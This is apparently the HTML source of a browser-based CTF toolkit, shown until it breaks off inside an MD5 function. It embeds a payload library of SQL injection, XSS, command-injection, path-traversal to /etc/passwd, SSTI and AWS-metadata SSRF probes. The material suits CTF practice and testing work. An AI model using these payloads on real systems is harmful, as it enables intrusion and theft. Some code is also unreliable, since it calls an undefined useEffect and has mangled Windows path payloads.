<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYPHER//TOOLKIT - Professional CTF Arsenal</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; font-family: 'JetBrains Mono', monospace; overflow-x: hidden;  background:#0a0e1a; color:#e0e0e0; }
        h1, h2, h3 { font-family: 'Orbitron', sans-serif; }
        @keyframes gridScroll { 0% { transform: translate(0, 0); } 100% { transform: translate(50px, 50px); } }
        @keyframes glowPulse { 0%, 100% { filter: drop-shadow(0 0 8px currentColor); } 50% { filter: drop-shadow(0 0 16px currentColor); } }
        .glow-text { text-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor; }
        .terminal-border { border: 1px solid; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1), 0 0 20px rgba(0, 255, 65, 0.1); }
        .tool-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .tool-card:hover { transform: translateY(-4px); box-shadow: 0 8px 32px rgba(0, 255, 65, 0.2); }
    </style>
</head>
<body>
    <div id="root" style="padding:16px;font-family:JetBrains Mono,monospace;">Loading CYPHER//TOOLKITâ€¦ (If this stays, open DevTools Console)</div>
<script>
(function(){
  function show(msg){
    try{
      var pre=document.getElementById('fatal-error');
      if(!pre){
        pre=document.createElement('pre');
        pre.id='fatal-error';
        pre.style.cssText='white-space:pre-wrap;max-width:1100px;margin:16px auto;padding:16px;border:1px solid rgba(0,255,65,.4);background:rgba(0,0,0,.35);color:#ff5c5c;border-radius:12px;font:13px/1.4 JetBrains Mono,monospace;';
        document.body.insertBefore(pre, document.body.firstChild.nextSibling);
      }
      pre.textContent = msg;
    }catch(e){}
  }
  window.addEventListener('error', function(ev){
    show('ðŸš¨ App crashed (window.error)\n' + (ev.message||'') + '\n' + (ev.filename||'') + ':' + (ev.lineno||0) + ':' + (ev.colno||0));
  });
  window.addEventListener('unhandledrejection', function(ev){
    show('ðŸš¨ Unhandled Promise Rejection\n' + (ev.reason && (ev.reason.stack||ev.reason.message) || String(ev.reason)));
  });
  window.__CY_FATAL__ = show;
  // sanity checks after 1s
  setTimeout(function(){
    if(!window.React || !window.ReactDOM){
      show('ðŸš¨ React libraries failed to load.\nCheck network access to unpkg.com / react-dom.');
    }
  }, 1000);
})();
</script>

    
<script type="application/json" id="payload-library-data">
{
  "sqli": [
    {
      "name": "Boolean auth bypass (single-quote)",
      "payload": "' OR '1'='1' -- -",
      "tags": "auth,boolean",
      "notes": "Classic boolean-based bypass. May need adaptation to backend/quoting."
    },
    {
      "name": "Boolean auth bypass (double-quote)",
      "payload": "\" OR \"1\"=\"1\" -- -",
      "tags": "auth,boolean",
      "notes": "Useful when input is wrapped in double quotes."
    },
    {
      "name": "Comment truncation",
      "payload": "admin'-- -",
      "tags": "auth,comment",
      "notes": "Tries to comment out the rest of a query after username."
    },
    {
      "name": "UNION basic (3 cols, NULLs)",
      "payload": "' UNION SELECT NULL,NULL,NULL -- -",
      "tags": "union",
      "notes": "Adjust NULL count to match column count."
    },
    {
      "name": "Time delay (MySQL)",
      "payload": "' OR SLEEP(3) -- -",
      "tags": "time",
      "notes": "Simple time-based test (MySQL/MariaDB)."
    },
    {
      "name": "Time delay (PostgreSQL)",
      "payload": "'; SELECT pg_sleep(3) --",
      "tags": "time",
      "notes": "Time-based test (PostgreSQL)."
    },
    {
      "name": "Order by probe",
      "payload": "' ORDER BY 1 -- -",
      "tags": "recon",
      "notes": "Increment ORDER BY to infer column count."
    },
    {
      "name": "Error-based probe",
      "payload": "' AND 1=CONVERT(int,(SELECT @@version)) --",
      "tags": "error",
      "notes": "May trigger visible errors (SQL Server)."
    }
  ],
  "xss": [
    {
      "name": "Simple script tag",
      "payload": "<script>alert(1)<\/script>",
      "tags": "reflected",
      "notes": "Works on permissive contexts. Escaped <\/script> is required inside script blocks."
    },
    {
      "name": "IMG onerror",
      "payload": "<img src=x onerror=alert(1)>",
      "tags": "reflected",
      "notes": "Often works when <script> is filtered but attributes pass."
    },
    {
      "name": "SVG onload",
      "payload": "<svg onload=alert(1)><\/svg>",
      "tags": "reflected",
      "notes": "Common alternative vector."
    },
    {
      "name": "Attribute break-out (double quote)",
      "payload": "\"><img src=x onerror=alert(1)>",
      "tags": "attr",
      "notes": "Use when injection occurs inside an HTML attribute quoted with \". "
    },
    {
      "name": "HTML event handler",
      "payload": "<button onclick=alert(1)>click<\/button>",
      "tags": "dom",
      "notes": "Basic event-handler test."
    }
  ],
  "cmdi": [
    {
      "name": "Command chain (;) + whoami",
      "payload": "; {CMD}",
      "tags": "unix",
      "notes": "Semicolon command chaining; replace {CMD}."
    },
    {
      "name": "Command chain (&&)",
      "payload": "&& {CMD}",
      "tags": "unix",
      "notes": "Runs second command only if first succeeds."
    },
    {
      "name": "Pipe into command (|)",
      "payload": "| {CMD}",
      "tags": "unix",
      "notes": "Pipes output to command; sometimes useful for bypassing."
    },
    {
      "name": "Windows chain (&)",
      "payload": "& {CMD}",
      "tags": "windows",
      "notes": "Windows command separator."
    },
    {
      "name": "Windows chain (&&)",
      "payload": "&& {CMD}",
      "tags": "windows",
      "notes": "Windows conditional chain."
    }
  ],
  "lfi": [
    {
      "name": "Linux passwd",
      "payload": "../../../../../etc/passwd",
      "tags": "linux",
      "notes": "Depth may vary; try adding/removing ../ segments."
    },
    {
      "name": "Linux proc self environ",
      "payload": "../../../../../proc/self/environ",
      "tags": "linux,proc",
      "notes": "Sometimes reveals env vars / secrets."
    },
    {
      "name": "Windows hosts",
      "payload": "......WindowsSystem32driversetchosts",
      "tags": "windows",
      "notes": "Backslashes for Windows paths."
    },
    {
      "name": "Traversal with URL-encoding (../)",
      "payload": "..%2f..%2f..%2fetc%2fpasswd",
      "tags": "encoding",
      "notes": "Use when raw ../ is filtered."
    }
  ],
  "ssti": [
    {
      "name": "Jinja2 basic expression",
      "payload": "{{7*7}}",
      "tags": "jinja2",
      "notes": "If you see 49 rendered, template injection is likely."
    },
    {
      "name": "Handlebars basic",
      "payload": "{{this}}",
      "tags": "handlebars",
      "notes": "Framework detection helper."
    },
    {
      "name": "ERB basic",
      "payload": "<%= 7*7 %>",
      "tags": "erb",
      "notes": "Ruby ERB test."
    }
  ],
  "ssrf": [
    {
      "name": "Localhost probe",
      "payload": "http://127.0.0.1/",
      "tags": "internal",
      "notes": "Checks if server can reach localhost."
    },
    {
      "name": "Metadata (AWS)",
      "payload": "http://169.254.169.254/latest/meta-data/",
      "tags": "cloud",
      "notes": "Cloud metadata endpoint probe (AWS). Use responsibly."
    },
    {
      "name": "Targeted internal host",
      "payload": "http://{IP}:{PORT}/",
      "tags": "internal",
      "notes": "Use placeholders for internal IP/port."
    }
  ],
  "traversal": [
    {
      "name": "Path traversal in parameter",
      "payload": "{TARGET}?{PARAM}=../../../../etc/passwd",
      "tags": "web",
      "notes": "Template shows how traversal looks when used in a URL param."
    },
    {
      "name": "Windows traversal in parameter",
      "payload": "{TARGET}?{PARAM}=......Windowswin.ini",
      "tags": "web,windows",
      "notes": "Common Windows file test."
    }
  ],
  "redirect": [
    {
      "name": "Open redirect (basic)",
      "payload": "{TARGET}?next=https://{DOMAIN}/",
      "tags": "web",
      "notes": "Adjust parameter name to match app (next/url/redirect/return)."
    },
    {
      "name": "Protocol-relative redirect",
      "payload": "{TARGET}?next=//{DOMAIN}/",
      "tags": "web",
      "notes": "Sometimes bypasses filters that block http(s)://."
    }
  ],
  "jwt": [
    {
      "name": "Header/payload placeholder",
      "payload": "HEADER.{PAYLOAD}.SIGNATURE",
      "tags": "tokens",
      "notes": "Use JWT tool to decode/edit/encode. Placeholder entry for workflows."
    }
  ]
}
</script>
<script>
        const Icon = ({ d, className = '', style = {} }) => React.createElement('svg', { className, style, width: '24', height: '24', viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round' }, React.createElement('path', { d }));
        const icons = {
            Shield: (p) => Icon({ ...p, d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' }),
            Terminal: (p) => Icon({ ...p, d: 'M4 17l6-6-6-6M12 19h8' }),
            Lock: (p) => Icon({ ...p, d: 'M19 11H5a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2zM7 11V7a5 5 0 0 1 10 0v4' }),
            Globe: (p) => Icon({ ...p, d: 'M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20zM2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z' }),
            Eye: (p) => Icon({ ...p, d: 'M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z M12 9a3 3 0 1 0 0 6 3 3 0 1 0 0-6z' }),
            Cpu: (p) => Icon({ ...p, d: 'M4 16V8a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4' }),
            Search: (p) => Icon({ ...p, d: 'M11 2a9 9 0 1 0 0 18 9 9 0 1 0 0-18zM21 21l-4.35-4.35' }),
            ChevronRight: (p) => Icon({ ...p, d: 'M9 18l6-6-6-6' }),
            Zap: (p) => Icon({ ...p, d: 'M13 2L3 14h9l-1 8 10-12h-9l1-8z' }),
            Fingerprint: (p) => Icon({ ...p, d: 'M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4' }),
            Key: (p) => Icon({ ...p, d: 'M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4' })
        };
        const { useState } = React;
        const e = React.createElement;
        
        // Payload library is stored as JSON (not inline JS) to prevent HTML parsing issues with payload content.
        function loadPayloadLibrary() {
            try {
                const el = document.getElementById('payload-library-data');
                if (!el) return {};
                return JSON.parse(el.textContent || '{}');
            } catch (err) {
                console.error('Failed to load payload library JSON', err);
                return {};
            }
        }
function CTFToolkit() {
            const [activeCategory, setActiveCategory] = useState('crypto');
            const [activeTool, setActiveTool] = useState('multi-codec');
            const [workspaceData, setWorkspaceData] = useState(() => {
                try { return JSON.parse(localStorage.getItem('cypher_workspace') || '{"text":"","hex":"","meta":{}}'); } catch(e){ return { text:'', hex:'', meta:{} }; }
            });
            useEffect(() => { try { localStorage.setItem('cypher_workspace', JSON.stringify(workspaceData)); } catch(e){} }, [workspaceData]);

            const categories = [
                { id: 'crypto', name: 'Cryptography', icon: 'Lock', color: '#00ff41' },
                { id: 'web', name: 'Web Exploitation', icon: 'Globe', color: '#00d9ff' },
                { id: 'forensics', name: 'Forensics', icon: 'Eye', color: '#ff00ff' },
                { id: 'binary', name: 'Binary/Reversing', icon: 'Cpu', color: '#ffaa00' },
                { id: 'osint', name: 'OSINT/Recon', icon: 'Search', color: '#ff0055' }
            ,
                { id: 'workspace', name: 'Workspace', icon: 'Folder', color: '#7c3aed' }];
            const tools = {crypto: [
                    { id: 'multi-codec', name: 'Multi-Codec Engine', desc: 'Advanced encoding/decoding with auto-detection' },
                    { id: 'hash-analysis', name: 'Hash Analyzer', desc: 'Hash identification & generation' },
                    { id: 'xor-bruteforce', name: 'XOR Bruteforcer', desc: 'Multi-key XOR analysis with scoring' },
                    { id: 'classical-cipher', name: 'Classical Cipher Lab', desc: 'Caesar, VigenÃ¨re, frequency analysis' },
                    { id: 'rsa-toolkit', name: 'RSA Calculator', desc: 'Modular arithmetic & factoring' }
                ],
                web: [
                    { id: 'jwt-toolkit', name: 'JWT Swiss Army Knife', desc: 'Decode, modify, forge JWTs' },
                    { id: 'payload-gen', name: 'Payload Generator', desc: 'SQLi, XSS, command injection' },
                    { id: 'url-parser', name: 'URL Parser', desc: 'Parse URLs into components' },
                    { id: 'html-encoder', name: 'HTML Encoder', desc: 'HTML entity encoding' }
                ],
                forensics: [
                    { id: 'meta-viewer', name: 'Metadata Viewer', desc: 'Basic file + image metadata' },
                    { id: 'entropy-graph', name: 'Entropy Graph', desc: 'Spot encryption/packing quickly' },
                    { id: 'hash-calc', name: 'Hash Calculator', desc: 'MD5/SHA1/SHA256 for IOCs' },
                    { id: 'hex-editor', name: 'Hex Editor Pro', desc: 'Hex/text conversion & search' },
                    { id: 'file-analyzer', name: 'File Signature Analyzer', desc: 'Identify by magic bytes' },
                    { id: 'string-extractor', name: 'String Extractor', desc: 'Extract ASCII strings' },
                    { id: 'binary-converter', name: 'Binary Converter', desc: 'Format conversion' }
                ,                    { id: 'entropy-check', name: 'Entropy / Randomness', desc: 'Quick entropy score & hints' },
                    { id: 'regex-lab', name: 'Regex Lab', desc: 'Test regex, extract matches' }
                ],
                binary: [
                    { id: 'pattern-finder', name: 'Byte Pattern Finder', desc: 'Search hex sequences + offsets' },
                    { id: 'strings-regex', name: 'Strings + Regex', desc: 'Extract strings + find flags/tokens' },
                    { id: 'header-viewer', name: 'PE/ELF Header Viewer', desc: 'Quick header + entry point' },
                    { id: 'ascii-converter', name: 'ASCII Converter', desc: 'ASCII code conversion' },
                    { id: 'endian-converter', name: 'Endian Converter', desc: 'Byte order swap' },
                    { id: 'bit-manipulator', name: 'Bit Manipulator', desc: 'Bitwise operations' },
                    { id: 'number-base', name: 'Number Base', desc: 'Dec/Hex/Oct/Bin' }
                ],
                osint: [
                    { id: 'hash-cracker', name: 'Hash Helper', desc: 'Generate variations' },
                    { id: 'username-formatter', name: 'Username Formatter', desc: 'Username formats' },
                    { id: 'email-permutator', name: 'Email Permutator', desc: 'Email variations' },
                    { id: 'phone-formatter', name: 'Phone Formatter', desc: 'Format phone numbers' },
                    { id: 'defang-refang', name: 'Defang / Refang IOCs', desc: 'Safe sharing of URLs/IPs + extract IOCs' },
                    { id: 'timestamp-converter', name: 'Timestamp Converter', desc: 'Unix â†” human time' },
                    { id: 'cidr-calculator', name: 'CIDR/Subnet Calculator', desc: 'Network ranges & hosts' }
                ],
                workspace: [
                    { id: 'workspace-hub', name: 'Workspace Hub', desc: 'Send data between tools, export cases' },
                    { id: 'notes-vault', name: 'Notes Vault', desc: 'Markdown notes + search + export' }
                ],
            };
            const currentCategory = categories.find(c => c.id === activeCategory);
            const currentTools = tools[activeCategory] || [];
            return e('div', { className: 'min-h-screen bg-[#0a0e1a] text-[#e0e0e0] font-mono overflow-hidden' },
                e('div', { className: 'fixed inset-0 opacity-20 pointer-events-none' },
                    e('div', { className: 'absolute inset-0', style: { backgroundImage: 'linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px)', backgroundSize: '50px 50px', animation: 'gridScroll 20s linear infinite' }})
                ),
                e('header', { className: 'relative border-b border-[#00ff41] bg-[#0a0e1a]/80 backdrop-blur-sm z-10' },
                    e('div', { className: 'container mx-auto px-6 py-6' },
                        e('div', { className: 'flex items-center justify-between' },
                            e('div', { className: 'flex items-center gap-4' },
                                e(icons.Shield, { className: 'w-10 h-10 text-[#00ff41]', style: { animation: 'glowPulse 2s ease-in-out infinite' }}),
                                e('div', null,
                                    e('h1', { className: 'text-3xl font-bold text-[#00ff41] glow-text tracking-wider' }, 'CYPHER//TOOLKIT'),
                                    e('p', { className: 'text-sm text-[#00ff41]/70 mt-1' }, 'Professional CTF Arsenal v2.0 - COMPLETE EDITION')
                                )
                            ),
                            e('div', { className: 'flex items-center gap-2 text-[#00ff41] text-sm' },
                                e(icons.Terminal, { className: 'w-4 h-4' }),
                                e('span', null, 'SYSTEM READY')
                            )
                        )
                    )
                ),
                e('div', { className: 'container mx-auto px-6 py-8' },
                    e('div', { className: 'grid grid-cols-12 gap-6' },
                        e('div', { className: 'col-span-3' },
                            e('div', { className: 'terminal-border border-[#00ff41]/30 bg-[#0f1419]/80 backdrop-blur-sm rounded-lg p-4' },
                                e('div', { className: 'flex items-center gap-2 mb-6 text-[#00ff41] text-sm font-bold' },
                                    e(icons.Zap, { className: 'w-4 h-4' }), e('span', null, 'CATEGORIES')
                                ),
                                e('div', { className: 'space-y-2' },
                                    ...categories.map(category => {
                                        const isActive = activeCategory === category.id;
                                        const IconComponent = icons[category.icon];
                                        return e('button', {
                                            key: category.id,
                                            onClick: () => { setActiveCategory(category.id); setActiveTool(tools[category.id][0].id); },
                                            className: `w-full flex items-center gap-3 px-4 py-3 rounded transition-all ${isActive ? 'bg-gradient-to-r from-[#00ff41]/20 to-transparent border-l-2 text-[#00ff41]' : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'}`,
                                            style: { borderLeftColor: isActive ? category.color : 'transparent' }
                                        },
                                            e(IconComponent, { className: 'w-5 h-5', style: { color: category.color }}),
                                            e('span', { className: 'text-sm font-medium flex-1 text-left' }, category.name),
                                            isActive && e(icons.ChevronRight, { className: 'w-4 h-4' })
                                        );
                                    })
                                ),
                                e('div', { className: 'mt-8 pt-6 border-t border-[#00ff41]/20' },
                                    e('div', { className: 'text-xs text-gray-500 space-y-2' },
                                        e('div', { className: 'flex justify-between' }, e('span', null, 'Tools:'), e('span', { className: 'text-[#00ff41]' }, Object.values(tools).flat().length)),
                                        e('div', { className: 'flex justify-between' }, e('span', null, 'Session:'), e('span', { className: 'text-[#00d9ff]' }, new Date().toLocaleTimeString()))
                                    )
                                )
                            )
                        ),
                        e('div', { className: 'col-span-9' },
                            e('div', { className: 'mb-6' },
                                e('div', { className: 'flex items-center gap-3 mb-4' },
                                    e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' }),
                                    e('h2', { className: 'text-xl font-bold uppercase tracking-wider', style: { color: currentCategory.color }}, currentCategory.name),
                                    e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' })
                                ),
                                e('div', { className: 'grid grid-cols-2 gap-4' },
                                    ...currentTools.map(tool => {
                                        const isActive = activeTool === tool.id;
                                        return e('button', {
                                            key: tool.id,
                                            onClick: () => setActiveTool(tool.id),
                                            className: `tool-card text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
                                        },
                                            e('h3', { className: 'font-bold mb-2', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
                                            e('p', { className: 'text-xs text-gray-400' }, tool.desc)
                                        );
                                    })
                                )
                            ),
                            e('div', { className: 'terminal-border border-[#00ff41]/30 bg-[#0f1419]/80 backdrop-blur-sm rounded-lg p-6' },
                                e(ToolInterface, { category: activeCategory, tool: activeTool, color: currentCategory.color, workspaceData, setWorkspaceData })
                            )
                        )
                    )
                )
            );
        }
        
        function NotesVault({ color, sendToWorkspace }) {
            const { useState, useEffect } = React;

            const [noteQuery, setNoteQuery] = useState('');
            const [notes, setNotes] = useState(() => {
                try { return JSON.parse(localStorage.getItem('cypher_notes') || '[]'); } catch(e){ return []; }
            });
            const [activeNoteId, setActiveNoteId] = useState(() => {
                try {
                    const stored = JSON.parse(localStorage.getItem('cypher_notes') || '[]');
                    return (stored[0] && stored[0].id) ? stored[0].id : null;
                } catch(e) { return null; }
            });

            useEffect(() => { try { localStorage.setItem('cypher_notes', JSON.stringify(notes)); } catch(e){} }, [notes]);

            const activeNote = notes.find(n => n.id === activeNoteId) || null;

            const createNote = () => {
                const n = { id: 'n_'+Date.now(), title: 'New Note', body: '', updatedAt: Date.now() };
                setNotes(prev => [n, ...prev]);
                setActiveNoteId(n.id);
            };
            const deleteNote = () => {
                if (!activeNote) return;
                setNotes(prev => prev.filter(n => n.id !== activeNote.id));
                setActiveNoteId(null);
            };
            const updateNote = (patch) => {
                if (!activeNote) return;
                setNotes(prev => prev.map(n => n.id===activeNote.id ? { ...n, ...patch, updatedAt: Date.now() } : n));
            };

            const filtered = (noteQuery.trim() ? notes.filter(n =>
                (n.title||'').toLowerCase().includes(noteQuery.toLowerCase()) ||
                (n.body||'').toLowerCase().includes(noteQuery.toLowerCase())
            ) : notes);

            return e('div', { className: 'space-y-4' },
                e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Notes Vault'),
                e('div', { className: 'grid grid-cols-12 gap-4' },
                    e('div', { className: 'col-span-4 rounded border border-gray-700 bg-black/30 p-3' },
                        e('div', { className: 'flex gap-2 mb-2' },
                            e('input', { value: noteQuery, onChange: (ev)=>setNoteQuery(ev.target.value), placeholder:'Search notesâ€¦', className:'w-full px-3 py-2 rounded bg-black/40 border border-gray-700 text-sm' }),
                            e('button', { onClick: createNote, className: 'px-3 py-2 rounded bg-[#00ff41]/10 border border-[#00ff41]/50 text-xs font-bold' }, 'NEW')
                        ),
                        e('div', { className: 'space-y-2 max-h-[420px] overflow-auto pr-1' },
                            ...filtered.map(n => e('button', {
                                key: n.id,
                                onClick: () => setActiveNoteId(n.id),
                                className: `w-full text-left p-2 rounded border ${n.id===activeNoteId ? 'border-[#00ff41]/60 bg-[#00ff41]/10' : 'border-gray-800 bg-black/20 hover:border-gray-600'}`
                            },
                                e('div', { className: 'text-sm font-bold text-gray-200' }, n.title),
                                e('div', { className: 'text-xs text-gray-500' }, new Date(n.updatedAt).toLocaleString())
                            ))
                        )
                    ),
                    e('div', { className: 'col-span-8 space-y-3' },
                        !activeNote ? e('div', { className: 'p-6 rounded border border-gray-700 bg-black/30 text-gray-400' }, 'Create or select a note.') :
                        e(React.Fragment, null,
                            e('input', { value: activeNote.title, onChange: (ev)=>updateNote({ title: ev.target.value }), className:'w-full px-3 py-2 rounded bg-black/40 border border-gray-700 text-sm font-bold text-gray-200' }),
                            e('textarea', { value: activeNote.body, onChange: (ev)=>updateNote({ body: ev.target.value }), placeholder:'# Markdownâ€¦', className:'w-full h-64 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                            e('div', { className: 'flex gap-2' },
                                e('button', { onClick: () => sendToWorkspace(activeNote.body, '', { type:'note', title: activeNote.title }), className:'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND NOTE â†’ WORKSPACE'),
                                e('button', { onClick: deleteNote, className:'w-full px-3 py-2 bg-red-500/10 border border-red-500/40 rounded text-xs font-bold' }, 'DELETE')
                            )
                        )
                    )
                )
            );
        }

function ToolInterface({ category, tool, color, workspaceData, setWorkspaceData }) {
            const [input, setInput] = useState('');
            
            const [output, setOutput] = useState('');
            const [fileName, setFileName] = useState('');
            const [fileBytes, setFileBytes] = useState(null);
            const [fileError, setFileError] = useState('');
            const [minStringLen, setMinStringLen] = useState(4);
            const [patternHex, setPatternHex] = useState('');
            const [patternResults, setPatternResults] = useState('');

            const bytesToHex = (u8) => Array.from(u8).map(b => b.toString(16).padStart(2,'0')).join('');
            const bytesToSpacedHex = (u8, cols=16) => {
                let out = '';
                for (let i=0;i<u8.length;i++){
                    out += u8[i].toString(16).padStart(2,'0') + ' ';
                    if ((i+1) % cols === 0) out += '\n';
                }
                return out.trim();
            };
            const decodeBytes = (u8) => { try { return new TextDecoder('utf-8', { fatal:false }).decode(u8); } catch(e){ return ''; } };
            const extractStrings = (u8, minLen=4) => {
                const out = [];
                let cur = '';
                for (let i=0;i<u8.length;i++){
                    const c = u8[i];
                    const ch = (c>=32 && c<=126) ? String.fromCharCode(c) : null;
                    if (ch) cur += ch;
                    else { if (cur.length >= minLen) out.push(cur); cur=''; }
                }
                if (cur.length >= minLen) out.push(cur);
                return out;
            };

            const readFileAsBytes = (file) => new Promise((resolve, reject) => {
                const r = new FileReader();
                r.onload = () => resolve(new Uint8Array(r.result));
                r.onerror = () => reject(r.error || new Error('File read error'));
                r.readAsArrayBuffer(file);
            });

            const handleLoadedBytes = (u8, f) => {
                setFileBytes(u8);
                setFileError('');
                setFileName(f && f.name ? f.name : '');
            };

            const FileDropZone = ({ label, help, onBytes }) => {
                const onPick = async (file) => {
                    if (!file) return;
                    setFileError('');
                    setFileName(file.name);
                    try {
                        const u8 = await readFileAsBytes(file);
                        handleLoadedBytes(u8, file);
                        if (onBytes) onBytes(u8, file);
                    } catch (err) {
                        console.error(err);
                        setFileError('Could not read file.');
                    }
                };

                return e('div', {
                        className: 'p-4 rounded-lg border border-gray-700 bg-black/30',
                        onDragOver: (ev) => { ev.preventDefault(); ev.dataTransfer.dropEffect = 'copy'; },
                        onDrop: (ev) => {
                            ev.preventDefault();
                            const f = ev.dataTransfer.files && ev.dataTransfer.files[0];
                            onPick(f);
                        }
                    },
                    e('div', { className: 'flex items-center justify-between gap-3' },
                        e('div', null,
                            e('div', { className: 'text-sm font-bold text-gray-200' }, label),
                            help ? e('div', { className: 'text-xs text-gray-500 mt-1' }, help) : null
                        ),
                        e('label', { className: 'cursor-pointer px-3 py-2 rounded bg-[#00ff41]/10 border border-[#00ff41]/60 text-xs font-bold hover:bg-[#00ff41]/15' },
                            'UPLOAD',
                            e('input', { type: 'file', className: 'hidden', onChange: (ev) => { const f = ev.target.files && ev.target.files[0]; ev.target.value=''; onPick(f); } })
                        )
                    ),
                    fileName ? e('div', { className: 'text-xs text-gray-400 mt-2' }, `File: ${fileName} (${fileBytes ? fileBytes.length : 0} bytes)`) : null,
                    fileError ? e('div', { className: 'text-xs text-red-400 mt-2' }, fileError) : null
                );
            };

            const sendToWorkspace = (text, hex, meta) => {
                setWorkspaceData({
                    text: (text ?? workspaceData.text ?? ''),
                    hex: (hex ?? workspaceData.hex ?? ''),
                    meta: meta ?? workspaceData.meta ?? {}
                });
            };

            // ---- Hashing (SHA1/SHA256 via SubtleCrypto; MD5 via tiny JS impl) ----
            const md5 = (function(){
              function cmn(q,a,b,x,s,t){a=(a+q+x+t)&0xFFFFFFFF;return (((a<<s)|(a>>> (32-s)))+b)&0xFFFFFFFF;}
              function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
              function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
              function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
              function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
              function toBytes(u8){const arr=[];for(let i=0;i<u8.length;i++)arr.push(u8[i]);return arr;}
              function md5bytes(u8){
                const msg = toBytes(u8);
                const origLen = msg.length;
                msg.push(0x80);
                while((msg.length % 64) !== 56) msg.push(0);
                const bitLen = origLen * 8;
                for(let i=0;i<8;i++) msg.push((bitLen >>> (8*i)) & 0xFF);
                let a=0x67452301,b=0xEFCDAB89,c=0x98BADCFE,d=0x10325476;
                for(let i=0;i<msg.length;i+=64){
                  const x=new Array(16);
                  for(let j=0;j<16;j++){
                    x[j]= msg[i+4*j] | (msg[i+4*j+1]<<8) | (msg[i+4*j+2]<<16) | (msg[i+4*j+3]<<24);
                  }
                  let aa=a,bb=b,cc=c,dd=d;
                  a=ff(a,b,c,d,x[0],7,-680876936); d=ff(d,a,b,c,x[1],12,-389564586); c=ff(c,d,a,b,x[2],17,606105819); b=ff(b,c,d,a,x[3],22,-1044525330);
                  a=ff(a,b,c,d,x[4],7,-176418897); d=ff(d,a,b,c,x[5],12,1200080426); c=ff(c,d,a,b,x[6],17,-1473231341); b=ff(b,c,d,a,x[7],22,-45705983);
                  a=ff(a,b,c,d,x[8],7,1770035416); d=ff(d,a,b,c,x[9],12,-1958414417); c=ff(c,d,a,b,x[10],17,-42063); b=ff(b,c,d,a,x[11],22,-1990404162);
                  a=ff(a,b,c,d,x[12],7,1804603682); d=ff(d,a,b,c,x[13],12,-40341101); c=ff(c,d,a,b,x[14],17,-1502002290); b=ff(b,c,d,a,x[15],22,1236535329);
                  a=gg(a,b,c,d,x[1],5,-165796510); d=gg(d,a,b,c,x[6],9,-1069501632); c=gg(c,d,a,b,x[11],14,643717713); b=gg(b,c,d,a,x[0],20,-373897302);
                  a=gg(a,b,c,d,x[5],5,-701558691); d=gg(d,a,b,c,x[10],9,38016083); c=gg(c,d,a,b,x[15],14,-660478335); b=gg(b,c,d,a,x[4],20,-405537848);
                  a=gg(a,b,c,d,x[9],5,568446438); d=gg(d,a,b,c,x[14],9,-1019803690); c=gg(c,d,a,b,x[3],14,-187363961); b=gg(b,c,d,a,x[8],20,1163531501);
                  a=gg(a,b,c,d,x[13],5,-1444681467); d=gg(d,a,b,c,x[2],9,-51403784); c=gg(c,d,a,b,x[7],14,1735328473); b=gg(b,c,d,a,x[12],20,-1926607734);
                  a=hh(a,b,c,d,x[5],4,-378558); d=hh(d,a,b,c,x[8],11,-2022574463); c=hh(c,d,a,b,x[11],16,1839030562); b=hh(b,c,d,a,x[14],23,-35309556);
                  a=hh(a,b,c,d,x[1],4,-1530992060); d=hh(d,a,b,c,x[4],11,1272893353); c=hh(c,d,a,b,x[7],16,-155497632); b=hh(b,c,d,a,x[10],23,-1094730640);
                  a=hh(a,b,c,d,x[13],4,681279174); d=hh(d,a,b,c,x[0],11,-358537222); c=hh(c,d,a,b,x[3],16,-722521979); b=hh(b,c,d,a,x[6],23,76029189);
